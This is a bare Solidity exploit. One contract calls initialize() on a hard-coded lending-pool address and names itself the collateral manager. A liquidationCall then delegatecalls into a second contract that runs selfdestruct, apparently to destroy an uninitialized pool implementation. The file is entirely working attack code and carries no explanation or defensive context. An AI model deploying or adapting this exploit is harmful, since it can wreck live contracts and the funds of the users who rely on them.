//SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

interface IPool {
    function initialize(address) external;
}

contract Contract {
    IPool pool = IPool(0x987115C38Fd9Fd2aA2c6F1718451D167c13a3186);

    constructor() {
        pool.initialize(address(this));
    }

    function getLendingPoolCollateralManager() external view returns (address) {
        return address(this);
    }

    function liquidationCall(address,address,address,uint256,bool) external returns(uint, string memory) {
        (bool success, ) = (0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0).delegatecall(abi.encodeWithSignature("destruct()"));
        require(success);
        return (0, "");
    }
}

// deployed @ 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
contract Destructor {
    function destruct() external{
        selfdestruct(msg.sender);
    }   
}